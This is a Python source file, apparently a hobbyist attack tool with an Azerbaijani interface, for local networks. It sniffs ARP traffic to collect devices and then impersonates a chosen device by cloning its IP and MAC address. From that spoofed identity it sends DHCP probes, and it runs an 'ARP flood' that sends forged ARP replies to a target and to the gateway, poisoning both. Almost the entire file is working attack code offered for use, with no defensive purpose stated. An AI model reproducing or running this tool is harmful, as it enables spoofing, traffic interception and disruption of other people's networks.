#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
from scapy.all import ARP, Ether, srp, send, sniff
import netifaces

COLORS = {
    'RESET': '\033[0m',
    'RED': '\033[91m',
    'GREEN': '\033[92m',
    'YELLOW': '\033[93m',
    'BLUE': '\033[94m',
    'PURPLE': '\033[95m',
    'CYAN': '\033[96m',
    'WHITE': '\033[97m',
    'BOLD': '\033[1m'
}

def print_banner():
    os.system('clear')
    banner = f"""
{COLORS['CYAN']}{COLORS['BOLD']}╔═══════════════════════════════════════════════════════════════════════╗{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║                                                          		║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║  {COLORS['RED']}    █████╗ ██████╗ ██████╗     ███████╗ ██████╗ █████╗ ███╗   ██╗{COLORS['CYAN']}  	║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║  {COLORS['RED']}   ██╔══██╗██╔══██╗██╔══██╗    ██╔════╝██╔════╝██╔══██╗████╗  ██║{COLORS['CYAN']}  	║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║  {COLORS['RED']}   ███████║██████╔╝██████╔╝    ███████╗██║     ███████║██╔██╗ ██║{COLORS['CYAN']}    ║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║  {COLORS['RED']}   ██╔══██║██╔══██╗██╔═══╝     ╚════██║██║     ██╔══██║██║╚██╗██║{COLORS['CYAN']}  	║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║  {COLORS['RED']}   ██║  ██║██║  ██║██║         ███████║╚██████╗██║  ██║██║ ╚████║{COLORS['CYAN']}  	║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║  {COLORS['RED']}   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝         ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝{COLORS['CYAN']}  	║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║                                                          		║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║  {COLORS['YELLOW']}Şəbəkə Analizi və Hücum Aləti v1.0                     {COLORS['CYAN']}  		║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║  {COLORS['GREEN']}Yaradıcı: {COLORS['WHITE']}Nağdalıyev Sənan                         {COLORS['CYAN']}  		║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}║                                                          		║{COLORS['RESET']}
{COLORS['CYAN']}{COLORS['BOLD']}╚═══════════════════════════════════════════════════════════════════════╝{COLORS['RESET']}
"""
    print(banner)

def print_status(message, status_type="info"):
    if status_type == "success":
        print(f"{COLORS['GREEN']}[+] {message}{COLORS['RESET']}")
    elif status_type == "info":
        print(f"{COLORS['BLUE']}[*] {message}{COLORS['RESET']}")
    elif status_type == "warning":
        print(f"{COLORS['YELLOW']}[!] {message}{COLORS['RESET']}")
    elif status_type == "error":
        print(f"{COLORS['RED']}[-] {message}{COLORS['RESET']}")

def get_user_input(prompt):
    return input(f"{COLORS['YELLOW']}{prompt}: {COLORS['RESET']}")

class NetworkScanner:
    def __init__(self):
        self.devices = []
        self.interface = None
        self.gateway_ip = None
        self.subnet_mask = None 
        self.cidr = 24  # Default CIDR dəyəri əlavə edirəm
        self.current_spoof_ip = None
        self.current_spoof_mac = None
        self.current_spoof_hostname = None
        self.captured_devices = {}
        self.stop_monitoring = False
        self.network_connection_name = None
        print_banner()
        print_status("ARP Şəbəkə Skan və Hücum Aləti işə düşdü", "info")
        self.disable_ip_protocols()
        self.setup_fake_identity()
        if self.interface and self.current_spoof_ip and self.current_spoof_mac:
            self.get_network_info_from_dhcp()
    
    def disable_ip_protocols(self):
        print(f"\n{COLORS['CYAN']}{COLORS['BOLD']}=== IP Protokollarını Söndürmə ==={COLORS['RESET']}\n")
        try:
            print_status("Şəbəkə axtarılır...", "info")
            nmcli_output = os.popen("nmcli connection show --active").read().strip() # nmcli əmrini icra edib aktiv şəbəkələri əldə edirik
            nmcli_lines = nmcli_output.split("\n") # Əldə edilən məlumatları sətirlərə bölürük
            if len(nmcli_lines) <= 1: # Əgər çıxış boşdursa xəta bildiririk və false qaytarırıq
                print_status("Aktiv şəbəkə tapılmadı!", "warning")
                return False
            header = nmcli_lines[0].split() # Başlıq sətirini götürürük və sütunları təyin edirik
            name_index = header.index("NAME") # NAME sütununun indeksini tapırıq
            device_index = header.index("DEVICE") # DEVICE sütununun indeksini tapırıq
            active_connections = [] # Aktiv şəbəkələri emal edirik
            for line in nmcli_lines[1:]:
                parts = line.split()
                if len(parts) > device_index:
                    conn_name = parts[name_index]
                    device_name = parts[device_index]
                    active_connections.append((conn_name, device_name))
            print_status("Hansı şəbəkədə IPv4 və IPv6 söndürülsün?", "info")
            print("")
            for idx, (conn_name, device_name) in enumerate(active_connections): # Hər şəbəkəni indeks ilə siyahılayırıq
                print(f"{COLORS['GREEN']}{idx}.{COLORS['RESET']} {conn_name} (Cihaz: {device_name})")
            while True:  # Düzgün seçim edilənə qədər döngü davam edəcək
                try:
                    selection = int(get_user_input("\nSeçiminizi daxil edin")) # İstifadəçidən seçim alırıq
                    if 0 <= selection < len(active_connections): # Seçimin düzgün olub-olmadığını yoxlayırıq
                        connection_name, device_name = active_connections[selection] # Seçilmiş şəbəkənin adını və cihazını alırıq
                        self.interface = device_name # İnterfeysi təyin edirik
                        self.network_connection_name = connection_name
                        print_status(f"'{connection_name}' şəbəkəsində IPv4 və IPv6 söndürülür...", "info")
                        print_status(f"İnterfeys olaraq '{self.interface}' təyin edildi", "info")
                        os.system(f"nmcli connection modify '{connection_name}' ipv4.method disabled >/dev/null 2>&1") # IPv4-ü söndürürük
                        os.system(f"nmcli connection modify '{connection_name}' ipv6.method disabled >/dev/null 2>&1") # IPv6-nı söndürürük
                        print_status("Şəbəkə yenidən konfiqurasiya edilir...", "info")
                        os.system(f"nmcli connection down '{connection_name}' >/dev/null 2>&1") # Şəbəkəni söndürürük
                        time.sleep(1)
                        os.system(f"nmcli connection up '{connection_name}' >/dev/null 2>&1") # Şəbəkəni aktivləşdiririk
                        time.sleep(1)
                        print_status(f"'{connection_name}' qoşulmasında IPv4 və IPv6 söndürüldü", "success")
                        return True
                    else:
                        print_status("Səhv seçim! Zəhmət olmasa düzgün nömrə daxil edin.", "error")
                except ValueError:
                    print_status("Xəta: Rəqəm daxil etməlisiniz.", "error")
        except Exception as e:
            print_status(f"Xəta: IP protokolları söndürülmədi: {e}", "error")
            return False
    
    def restore_ip_protocols(self):
        if self.network_connection_name:
            try:
                print_status(f"'{self.network_connection_name}' şəbəkəsində IPv4 və IPv6 avtomatik rejimə qaytarılır...", "info")
                os.system(f"nmcli connection modify '{self.network_connection_name}' ipv4.method auto >/dev/null 2>&1") # IPv4-ü avtomatik rejimə qaytarırıq
                os.system(f"nmcli connection modify '{self.network_connection_name}' ipv6.method auto >/dev/null 2>&1") # IPv6-nı avtomatik rejimə qaytarırıq
                print_status("Şəbəkə yenidən konfiqurasiya edilir...", "info")
                os.system(f"nmcli connection down '{self.network_connection_name}' >/dev/null 2>&1") # Şəbəkəni söndürürük
                time.sleep(1)
                os.system(f"nmcli connection up '{self.network_connection_name}' >/dev/null 2>&1") # Şəbəkəni aktivləşdiririk
                time.sleep(1)
                print_status(f"'{self.network_connection_name}' şəbəkəsində IPv4 və IPv6 avtomatik rejimə qaytarıldı", "success")
                return True
            except Exception as e:
                print_status(f"Xəta: IP protokolları avtomatik rejimə qaytarılmadı: {e}", "error")
                return False
        return False
    
    def setup_fake_identity(self):       
        self.listen_for_devices() # Şəbəkədəki cihazları dinləmə
        if self.captured_devices: # Əgər yaxalanmış cihazlar varsa
            while True:
                print_banner()
                print_status("Yaxalanmış cihazlar:", "info")
                for idx, (ip, mac) in enumerate(self.captured_devices.items()): # Hər bir cihazın IP və MAC ünvanını göstəririk
                    print(f"{idx}. IP: {ip}, MAC: {mac}")
                print("")
                print_status("Seçim 1: Cihazlardan birini seçin", "info")
                print_status("Seçim 2: Öz parametrlərinizi daxil edin", "info")
                spoof_choice = get_user_input("\nSeçiminizi edin (1/2)") # İstifadəçi seçim edir
                if spoof_choice == "1": # Əgər istifadəçi mövcud cihazlardan birini seçmək istəyirsə 1 seçir
                    try:
                        idx = int(get_user_input("Cihaz nömrəsini daxil edin")) # İstifadəçidən cihaz nömrəsini alırıq
                        if 0 <= idx < len(self.captured_devices): # Seçilmiş nömrənin düzgün olub-olmadığını yoxlayırıq
                            selected_ip, selected_mac = list(self.captured_devices.items())[idx] # Seçilmiş cihazın IP və MAC ünvanını alırıq
                            hostname = f"device-{selected_ip.split('.')[-1]}" # Cihaz üçün avtomatik hostname yaradırıq
                            return self.create_fake_identity(selected_ip, selected_mac, hostname) # Saxta kimlik yaradırıq və nəticəni qaytarırıq
                        else:
                            print_status("Səhv seçim! Siyahıdakı mövcud cihaz nömrələrindən birini seçin.", "error")
                    except ValueError:
                        print_status("Xəta: Rəqəm daxil etməlisiniz.", "error")
                elif spoof_choice == "2": # Əgər istifadəçi öz parametrlərini daxil etmək istəyirsə
                    fake_ip = get_user_input("Saxta IP ünvanı daxil edin: ")
                    fake_mac = get_user_input("Saxta MAC ünvanı daxil edin: ")
                    device_name = get_user_input("Saxta cihaz adı daxil edin: ")
                    return self.create_fake_identity(fake_ip, fake_mac, device_name)
                else:
                    print_status("Səhv seçim! Zəhmət olmasa 1 və ya 2 seçimini edin.", "error")
        else:
            print_status("Heç bir cihaz yaxalanmayıb! Əl ilə daxil edin:", "warning")
            fake_ip = get_user_input("Saxta IP ünvanı daxil edin: ")
            fake_mac = get_user_input("Saxta MAC ünvanı daxil edin: ")
            device_name = get_user_input("Saxta cihaz adı daxil edin: ")
            return self.create_fake_identity(fake_ip, fake_mac, device_name)
    
    def calculate_cidr_from_subnet_mask(self, subnet_mask):
        try:
            if not subnet_mask:
                return 24  # Subnet mask olmadıqda default olaraq /24 qaytarır
            binary = ""
            for octet in subnet_mask.split('.'):
                binary += bin(int(octet))[2:].zfill(8)
            cidr = binary.count('1')
            print_status(f"Subnet mask {subnet_mask} əsasında CIDR dəyəri hesablandı: /{cidr}", "info")
            return cidr
        except Exception as e:
            print_status(f"CIDR hesablama xətası: {e}", "error")
            return 24  # Xəta baş verdikdə default olaraq /24 qaytarır
    
    def get_network_info_from_dhcp(self):
        if not self.interface: # İnterfeys təyin edilməyibsə, onu təyin edirik
            self.get_interface()
        from scapy.all import Ether, IP, UDP, BOOTP, DHCP, sendp, sniff # Lazımi modulları import edirik
        import random
        print_status(f"DHCP serverinə sorğu göndərilir...", "info")
        mac_addr = self.current_spoof_mac if self.current_spoof_mac else netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0]['addr'] # Saxta MAC ünvanını təyin edirik
        ip_addr = self.current_spoof_ip if self.current_spoof_ip else "0.0.0.0" # Saxta IP ünvanını təyin edirik
        print_status(f"DHCP sorğusu {mac_addr} MAC ünvanı və {ip_addr} IP ünvanı ilə göndərilir...", "info")
        max_attempts = 6 # DHCP sorğu parametrlərini təyin edirik
        interval = 4
        timeout = 2
        mac_bytes = bytes.fromhex(mac_addr.replace(':', '')) # MAC ünvanını bayt formatına çeviririk
        for attempt in range(1, max_attempts + 1): # Döngü başladırıq
            transaction_id = random.randint(1, 900000000) # Hər cəhd üçün yeni Transaction ID yaradırıq
            hostname = f"device-{random.randint(1000, 9999)}" # Hər cəhd üçün yeni hostname yaradırıq
            ethernet = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac_addr) # Broadcast MAC ünvanı
            ip = IP(src=ip_addr, dst="255.255.255.255") # Broadcast IP ünvanı
            udp = UDP(sport=68, dport=67) # DHCP portları
            bootp = BOOTP(chaddr=mac_bytes, xid=transaction_id, ciaddr=ip_addr)
            dhcp_options = [ # DHCP seçimlərini təyin edirik
                ("message-type", "inform"),
                ("client_id", bytes([1]) + mac_bytes),
                ("hostname", f"device-{ip_addr.split('.')[-1]}"),
                ("param_req_list", [1, 3, 6, 12, 15, 28, 51, 58, 59]),
                "end"
            ]
            dhcp_inform = ethernet / ip / udp / bootp / DHCP(options=dhcp_options) # DHCP paketini yaradırıq
            try:
                print_status(f"DHCP Inform mesajı göndərilir (cəhd {attempt}/{max_attempts})", "info")
                sendp(dhcp_inform, iface=self.interface, verbose=0) # DHCP Inform mesajını göndəririk
                def dhcp_callback(packet): # DHCP cavabını yoxlamaq üçün callback funksiyası
                    if DHCP in packet and BOOTP in packet and packet[BOOTP].xid == transaction_id:
                        for option in packet[DHCP].options:
                            if isinstance(option, tuple) and option[0] == 'message-type' and option[1] == 5:  # ACK mesajı
                                return True
                        return False
                    return False
                print_status("DHCP ACK mesajı gözlənilir...", "info")
                response_packets = sniff(iface=self.interface, 
                                      filter="udp and src port 67 and dst port 68", 
                                      timeout=timeout, 
                                      count=1, 
                                      lfilter=dhcp_callback)
                if response_packets and len(response_packets) > 0: # Cavab paketini yoxlayırıq
                    response = response_packets[0]
                    if DHCP in response and BOOTP in response:
                        print_status(f"DHCP ACK mesajı alındı! (cəhd {attempt}/{max_attempts})", "success")
                        subnet_mask = None
                        router = None
                        for option in response[DHCP].options:
                            if isinstance(option, tuple) and len(option) >= 2:
                                if option[0] == 'subnet_mask':
                                    subnet_mask = option[1]
                                    self.subnet_mask = subnet_mask
                                    self.cidr = self.calculate_cidr_from_subnet_mask(subnet_mask)
                                elif option[0] == 'router':
                                    router = option[1]
                                    self.gateway_ip = router
                        if router:
                            self.gateway_ip = router
                            print_status(f"Gateway avtomatik təyin edildi: {self.gateway_ip}", "success")
                            if subnet_mask:
                                mask_parts = subnet_mask.split('.')
                                ip_parts = ip_addr.split('.')
                                network_prefix = []
                                for i in range(4):
                                    network_prefix.append(str(int(ip_parts[i]) & int(mask_parts[i])))
                                network = '.'.join(network_prefix) + f'/{self.cidr}'  # CIDR dəyəri istifadə edilir
                                print_status(f"Şəbəkə prefixi təyin edildi: {network}")
                            return self.gateway_ip
                        print_status("DHCP cavabında Gateway məlumatı yoxdur!", "warning")
                else:
                    if attempt < max_attempts:
                        print_status(f"DHCP ACK mesajı alınmadı. {interval} saniyə gözləyib yenidən cəhd edilir...", "warning")
                        time.sleep(interval)
                    else:
                        print_status(f"{max_attempts} cəhddən sonra DHCP ACK mesajı alınmadı!", "warning")
                        if self.current_spoof_ip:
                            ip_parts = self.current_spoof_ip.split('.')
                            # Təxmini gateway IP (şəbəkənin ilk ünvanı)
                            self.gateway_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
                            print_status(f"DHCP cavabı alınmadı, təxmini Gateway təyin edildi: {self.gateway_ip}", "info")
                            return self.gateway_ip
            except Exception as e:
                print_status(f"DHCP sorğusu xətası: {e}", "warning")
                import traceback
                traceback.print_exc()
                if attempt < max_attempts:
                    print_status(f"{interval} saniyə gözləyib yenidən cəhd edilir...", "info")
                    time.sleep(interval)
        if self.current_spoof_ip:
            ip_parts = self.current_spoof_ip.split('.')
            self.gateway_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
            print_status(f"DHCP cavabı alınmadı, təxmini Gateway təyin edildi: {self.gateway_ip}", "info")
            return self.gateway_ip
        print_status("Bütün DHCP cəhdləri uğursuz oldu.", "warning")
        return False
    
    def get_interface(self):
        if self.interface:
            return self.interface
        try:
            interfaces = netifaces.interfaces()
            active_interfaces = []
            print("")
            print_status("Aktiv şəbəkə interfeyslər:", "info")
            for idx, iface in enumerate(interfaces):
                addrs = netifaces.ifaddresses(iface)
                if netifaces.AF_INET in addrs:
                    ip = addrs[netifaces.AF_INET][0]['addr']
                    active_interfaces.append((iface, ip))
                    print_status(f"{idx}. {iface} - {ip}", "success")
            if not active_interfaces:
                print_status("Aktiv şəbəkə interfeys tapılmadı!", "error")
                sys.exit(1)
            selection = int(get_user_input("\nİstifadə etmək istədiyiniz interfeysin nömrəsini seçin: "))
            if 0 <= selection < len(active_interfaces):
                self.interface = active_interfaces[selection][0]
                print_status(f"Seçilmiş interfeys: {self.interface}", "info")
                return self.interface
            else:
                print_status("Səhv seçim!", "error")
                sys.exit(1)
        except Exception as e:
            print_status(f"Xəta: {e}", "error")
            sys.exit(1)
    
    def scan_network(self):
        if not self.interface:
            self.get_interface()
        if not self.current_spoof_ip or not self.current_spoof_mac:
            print("")
            print_status("Şəbəkəni skan etmək üçün əvvəlcə saxta cihaz kimliyi yaratmalısınız.", "warning")
            return
        ip_parts = self.current_spoof_ip.split('.') # IP ünvanını hissələrə bölürük
        cidr = self.cidr if hasattr(self, 'cidr') and self.cidr else 24 # CIDR dəyərini təyin edirik
        if self.subnet_mask: # Əgər subnet mask varsa, şəbəkə prefixini hesablayırıq
            mask_parts = self.subnet_mask.split('.') # Subnet mask yoxdursa, default şəbəkə prefixi istifadə edirik
            network_prefix = []
            for i in range(4):
                network_prefix.append(str(int(ip_parts[i]) & int(mask_parts[i])))
            network = '.'.join(network_prefix) + f'/{cidr}'
        else:
            network = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/{cidr}" 
        print("")
        print_status(f"{network} şəbəkəsi skanlanır...", "info")
        try:
            from scapy.all import get_if_hwaddr
            src_mac = self.current_spoof_mac if self.current_spoof_mac else get_if_hwaddr(self.interface)# MAC ünvanı təyin edirik
            src_ip = self.current_spoof_ip if self.current_spoof_ip else None  # IP ünvanını təyin edirik
            arp = ARP(pdst=network, hwsrc=src_mac) # ARP paketini yaradırıq
            if src_ip:
                arp.psrc = src_ip
            ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=src_mac) # Ethernet frame yaradırıq
            packet = ether/arp # Tam paketi yaradırıq
            print_status(f"ARP sorğuları {src_mac} MAC ünvanı ilə göndərilir...", "info")
            if src_ip:
                print_status(f"Source IP ünvanı: {src_ip}")
            timeout = 10
            print_status(f"ARP cavabları {timeout} saniyə ərzində gözlənilir...", "info")
            result = srp(packet, timeout=timeout, iface=self.interface, verbose=0)[0] # ARP sorğularını göndəririk və cavab alırıq
            self.devices = [] # Tapılan cihazları saxlayırıq
            for sent, received in result: # Hər bir cavabı emal edirik
                self.devices.append({'ip': received.psrc, 'mac': received.hwsrc})
                self.captured_devices[received.psrc] = received.hwsrc
            print_status(f"{len(self.devices)} cihaz tapıldı:", "info") # Cihazların siyahısını göstəririk
            print("IP\t\t\tMAC")
            print("-" * 40)
            for idx, device in enumerate(self.devices):
                print(f"{idx}. {device['ip']}\t\t{device['mac']}")
            return self.devices
        except Exception as e:
            print_status(f"Şəbəkə skanı xətası: {e}", "error")
            return []
    
    def arp_flood(self, target_ip, target_mac, count=1000, interval=0.01):
        if not self.interface:
            self.get_interface()
        print_status(f"{target_ip} cihazına ARP flood hücumu başlayır...", "info")
        print_status(f"{count} paket, {interval} saniyə intervalla göndərilir...", "info")
        try:
            from scapy.all import get_if_hwaddr
            src_mac = self.current_spoof_mac if self.current_spoof_mac else get_if_hwaddr(self.interface)
            src_ip = self.current_spoof_ip if self.current_spoof_ip else None
            gateway_ip = None
            if hasattr(self, 'gateway_ip') and self.gateway_ip:
                gateway_ip = self.gateway_ip
            else:
                ip_parts = self.current_spoof_ip.split('.')
                gateway_ip = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.1"
            if not src_ip:
                src_ip = gateway_ip
                print_status(f"Source IP olaraq Gateway IP istifadə edilir: {src_ip}", "info")
            else:
                print_status(f"Source IP olaraq spoof edilmiş IP istifadə edilir: {src_ip}", "info")
            print_status(f"ARP paketləri {src_mac} MAC ünvanı ilə göndərilir...", "info")
            from scapy.all import Ether, sendp
            for i in range(count):
                arp_packet1 = ARP(
                    op=2,
                    pdst=target_ip,
                    hwdst=target_mac,
                    hwsrc=src_mac
                )
                arp_packet2 = ARP(
                    op=2,
                    pdst=gateway_ip,
                    psrc=target_ip,
                    hwsrc=src_mac
                )
                gateway_mac = None
                for ip, mac in self.captured_devices.items():
                    if ip == gateway_ip:
                        gateway_mac = mac
                        break
                if gateway_mac:
                    arp_packet2.hwdst = gateway_mac
                else:
                    arp_packet2.hwdst = "ff:ff:ff:ff:ff:ff"
                eth_frame1 = Ether(src=src_mac, dst=target_mac) / arp_packet1
                eth_frame2 = Ether(src=src_mac, dst=arp_packet2.hwdst) / arp_packet2
                sendp(eth_frame1, iface=self.interface, verbose=0)
                sendp(eth_frame2, iface=self.interface, verbose=0)
                if i % 50 == 0:
                    print_status(f"{i} paket göndərildi...", "success")
                time.sleep(interval)
            print_status(f"ARP flood hücumu tamamlandı, {count*2} paket göndərildi", "info")
            return True
        except KeyboardInterrupt:
            print_status("ARP flood hücumu dayandırıldı", "warning")
            return False
        except Exception as e:
            print_status(f"ARP flood xətası: {e}", "error")
            import traceback
            traceback.print_exc()
            return False
    
    def create_fake_identity(self, fake_ip, fake_mac, device_name=None):
        if not self.interface:
            self.get_interface()
        print_status(f"Saxta cihaz kimliyi yaradılır: ({fake_ip}, {fake_mac})", "info")
        self.stop_monitoring = True # Dinləmə prosesini dayandırırıq
        time.sleep(0.5)  # Thread-in dayanması üçün gözləyirik
        try:
            os.system(f"ifconfig {self.interface} down") # Şəbəkə interfeysini söndürürük
            os.system(f"ifconfig {self.interface} hw ether {fake_mac}") # MAC ünvanını dəyişdiririk
            os.system(f"ifconfig {self.interface} up") # Şəbəkə interfeysini yenidən aktivləşdiririk
            os.system(f"ifconfig {self.interface} {fake_ip}") # IP ünvanını təyin edirik
            self.current_spoof_ip = fake_ip # Cari saxta cihaz adını saxlayırıq
            self.current_spoof_mac = fake_mac
            self.current_spoof_hostname = device_name
            print_status(f"Kimlik dəyişdirildi: ({fake_ip}, {fake_mac})", "success")
            return True
        except Exception as e:
            print_status(f"Kimlik dəyişdirmə xətası: {e}", "error")
            return False
    
    def listen_for_devices(self):
        from scapy.all import sniff, ARP
        print_status(f"{self.interface} interfeysi üzərindən şəbəkə dinlənilir...", "info")
        try:
            def process_packet(packet):
                if ARP in packet:
                    src_ip = packet[ARP].psrc
                    src_mac = packet[ARP].hwsrc
                    if src_ip not in self.captured_devices and src_ip != "0.0.0.0" and src_mac != "00:00:00:00:00:00":
                        self.captured_devices[src_ip] = src_mac
                        print(f"Yeni cihaz aşkarlandı: IP: {src_ip}, MAC: {src_mac}")
            sniff(iface=self.interface, filter="arp", prn=process_packet, store=0)
        except KeyboardInterrupt:
            print("")
            print_status("Dinləmə dayandırıldı. Aşkarlanmış cihazlar:", "info")
            if self.captured_devices:
                for idx, (ip, mac) in enumerate(self.captured_devices.items()):
                    print(f"{idx}. IP: {ip}, MAC: {mac}")
            else:
                print_status("Heç bir cihaz aşkarlanmadı.", "warning")
        except Exception as e:
            print_status(f"Şəbəkə dinləmə xətası: {e}", "error")

def interactive_mode(scanner):
    options = {
        "1": "Şəbəkəni skan et",
        "2": "ARP flood hücumu et",
        "3": "Saxta cihaz kimliyi yarat",
        "4": "Şəbəkəni dinlə",
        "0": "Çıxış"
    }
    while True:
        print_banner()
        if scanner.current_spoof_ip and scanner.current_spoof_mac:
            print(f"{COLORS['CYAN']}Cari kimlik: {COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  IP: {COLORS['WHITE']}{scanner.current_spoof_ip}{COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  MAC: {COLORS['WHITE']}{scanner.current_spoof_mac}{COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  Gateway: {COLORS['WHITE']}{scanner.gateway_ip}{COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  Netmask: {COLORS['WHITE']}{scanner.subnet_mask}{COLORS['RESET']}")
            print(f"\n{COLORS['YELLOW']}Yadda saxlanmış cihazlar: {COLORS['WHITE']}{len(scanner.captured_devices)}{COLORS['RESET']}")
            print(f"\n{COLORS['YELLOW']}{COLORS['BOLD']}Əmrlər:{COLORS['RESET']}")
            for key, value in options.items():
                print(f"{COLORS['GREEN']}{key}.{COLORS['RESET']} {value}")
        choice = get_user_input("\nSeçiminizi edin")
        if choice == "1":
            scanner.scan_network()
            input(f"\n{COLORS['YELLOW']}Davam etmək üçün ENTER basın...{COLORS['RESET']}")
        elif choice == "2":
            print_banner()
            print(f"{COLORS['CYAN']}Cari kimlik: {COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  IP: {COLORS['WHITE']}{scanner.current_spoof_ip}{COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  MAC: {COLORS['WHITE']}{scanner.current_spoof_mac}{COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  Gateway: {COLORS['WHITE']}{scanner.gateway_ip}{COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  Netmask: {COLORS['WHITE']}{scanner.subnet_mask}{COLORS['RESET']}")
            print(f"\n{COLORS['YELLOW']}Yadda saxlanmış cihazlar: {COLORS['WHITE']}{len(scanner.captured_devices)}{COLORS['RESET']}")
            print(f"\n{COLORS['CYAN']}{COLORS['BOLD']}=== ARP Flood Hücumu ==={COLORS['RESET']}\n")
            if scanner.captured_devices:
                print_status("Yadda saxlanmış cihazlar:", "info")
                devices_list = []
                for idx, (ip, mac) in enumerate(scanner.captured_devices.items()):
                    print(f"{COLORS['GREEN']}{idx}.{COLORS['RESET']} IP: {ip}, MAC: {mac}")
                    devices_list.append({"ip": ip, "mac": mac})
                try:
                    target_idx = int(get_user_input("\nHücum etmək üçün hədəf cihazın nömrəsini seçin"))
                    if 0 <= target_idx < len(devices_list):
                        target = devices_list[target_idx]
                        count = int(get_user_input("Göndəriləcək paket sayı (default: 1000)") or "1000")
                        interval = float(get_user_input("Paketlər arası interval, saniyə (default: 0.01)") or "0.01")
                        scanner.arp_flood(target['ip'], target['mac'], count, interval)
                    else:
                        print_status("Səhv seçim!", "error")
                except ValueError:
                    print_status("Xəta: Düzgün rəqəm daxil edin", "error")
            else:
                print_status("Yadda saxlanmış cihaz yoxdur. Əvvəlcə şəbəkəni skan edin.", "warning")
            input(f"\n{COLORS['YELLOW']}Davam etmək üçün ENTER basın...{COLORS['RESET']}")
        elif choice == "3":
            print_banner()
            print(f"{COLORS['CYAN']}Cari kimlik: {COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  IP: {COLORS['WHITE']}{scanner.current_spoof_ip}{COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  MAC: {COLORS['WHITE']}{scanner.current_spoof_mac}{COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  Gateway: {COLORS['WHITE']}{scanner.gateway_ip}{COLORS['RESET']}")
            print(f"{COLORS['CYAN']}  Netmask: {COLORS['WHITE']}{scanner.subnet_mask}{COLORS['RESET']}")
            print(f"\n{COLORS['YELLOW']}Yadda saxlanmış cihazlar: {COLORS['WHITE']}{len(scanner.captured_devices)}{COLORS['RESET']}")
            print(f"\n{COLORS['CYAN']}{COLORS['BOLD']}=== Saxta Cihaz Kimliyi Yaratma ==={COLORS['RESET']}\n")
            if scanner.captured_devices:
                print_status("Yadda saxlanmış cihazlar:", "info")
                devices_list = []
                for idx, (ip, mac) in enumerate(scanner.captured_devices.items()):
                    print(f"{COLORS['GREEN']}{idx}.{COLORS['RESET']} IP: {ip}, MAC: {mac}")
                    devices_list.append({"ip": ip, "mac": mac})
                print("")
                print_status("Seçim 1: Cihazlardan birini seçin", "info")
                print_status("Seçim 2: Öz parametrlərinizi daxil edin", "info")
                spoof_choice = get_user_input("\nSeçiminizi edin (1/2)")
                if spoof_choice == "1":
                    try:
                        idx = int(get_user_input("Cihaz nömrəsini daxil edin"))
                        if 0 <= idx < len(devices_list):
                            target = devices_list[idx]
                            device_name = get_user_input("Saxta cihaz adı daxil edin") or f"device-{target['ip'].split('.')[-1]}"
                            scanner.create_fake_identity(target['ip'], target['mac'], device_name)
                        else:
                            print_status("Səhv seçim! Siyahıdakı mövcud cihaz nömrələrindən birini seçin.", "error")
                    except ValueError:
                        print_status("Xəta: Rəqəm daxil etməlisiniz.", "error")
                elif spoof_choice == "2":
                    fake_ip = get_user_input("Saxta IP ünvanı daxil edin")
                    fake_mac = get_user_input("Saxta MAC ünvanı daxil edin")
                    device_name = get_user_input("Saxta cihaz adı daxil edin")
                    scanner.create_fake_identity(fake_ip, fake_mac, device_name)
                else:
                    print_status("Səhv seçim! Zəhmət olmasa 1 və ya 2 seçimini edin.", "error")
            else:
                fake_ip = get_user_input("Saxta IP ünvanı daxil edin")
                fake_mac = get_user_input("Saxta MAC ünvanı daxil edin")
                device_name = get_user_input("Saxta cihaz adı daxil edin")
                scanner.create_fake_identity(fake_ip, fake_mac, device_name)
            input(f"\n{COLORS['YELLOW']}Davam etmək üçün ENTER basın...{COLORS['RESET']}")
        elif choice == "4":
            print_status("Şəbəkə dinlənilir, dayandırmaq üçün Ctrl+C basın...", "info")
            scanner.listen_for_devices()
            input(f"\n{COLORS['YELLOW']}Davam etmək üçün ENTER basın...{COLORS['RESET']}")
        elif choice == "0":
            print_status("Proqramdan çıxılır...", "info")
            time.sleep(1)
            break
        else:
            print_status("Səhv seçim, yenidən cəhd edin", "error")
            time.sleep(1)

def main():
    scanner = None
    try:
        scanner = NetworkScanner()
        interactive_mode(scanner)
    except KeyboardInterrupt:
        print_status("\nProqram dayandırıldı!", "warning")
    finally:
        print_status("\nŞəbəkə təyinatları bərpa edilir...", "info")
        if scanner is not None and hasattr(scanner, 'restore_ip_protocols'):
            scanner.restore_ip_protocols()
        print_banner()
        print_status("ARP Şəbəkə Skan və Hücum Aləti bağlandı", "info")
        time.sleep(1)
        os.system('clear')

if __name__ == "__main__":
    if os.geteuid() != 0:
        print_banner()
        print_status("Bu proqramı işlətmək üçün root hüquqları lazımdır!", "error")
        sys.exit(1)
    main() 